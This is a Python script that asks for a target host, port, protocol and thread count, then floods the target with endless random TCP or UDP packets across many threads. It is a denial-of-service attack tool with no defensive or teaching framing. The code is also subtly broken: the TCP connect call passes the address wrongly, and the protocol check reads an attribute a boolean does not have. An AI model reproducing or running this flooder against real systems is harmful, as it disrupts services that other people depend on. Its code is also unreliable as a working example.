import random
import socket
import threading

ip = str(input("Host/IP: "))
port = int(input("Port: "))
choice = str(input("TCP or UDP?"))
times = int(input("Packets per connection: "))
threads = int(input("Threads: "))

def floodUDP():
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (str(ip), int(port))
            for x in range(times):
                s.sendto(data,address)
            print(i + " packets sent")
        except:
            print("Error")

def floodTCP():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(ip, port)
            for x in range(times):
                s.send(data)
            print(i + "packets sent")
        except:
            print("Error")

for y in range(threads):
    if(choice == "UDP").upper:
        th = threading.Thread(target = floodUDP)
        th.start()
    elif(choice == "TCP").upper:
        th = threading.Thread(target = floodTCP)
        th.start()
    else:
        print("Wrong input given")

